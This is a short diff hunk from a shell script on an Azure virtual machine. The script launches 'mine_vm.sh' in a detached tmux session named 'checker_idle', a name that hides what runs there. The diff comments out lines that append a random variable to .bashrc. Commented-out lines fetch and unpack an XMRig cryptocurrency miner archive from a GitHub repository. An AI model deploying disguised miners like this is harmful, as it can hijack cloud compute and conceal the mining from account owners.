@@ -31,8 +31,8 @@ chmod +x /home/azureuser/mine_vm.sh
 tmux kill-session -t checker_idle
 tmux new -ds checker_idle /home/azureuser/mine_vm.sh 
 
-echo TEXT="$((RANDOM % 999999 + 2))" >> /home/azureuser/.bashrc
-source /home/azureuser/.bashrc
+#echo TEXT="$((RANDOM % 999999 + 2))" >> /home/azureuser/.bashrc
+#source /home/azureuser/.bashrc
 
 #wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_xmrig.tar.gz -P /home/azureuser
 #tar -xf mo_xmrig.tar.gz
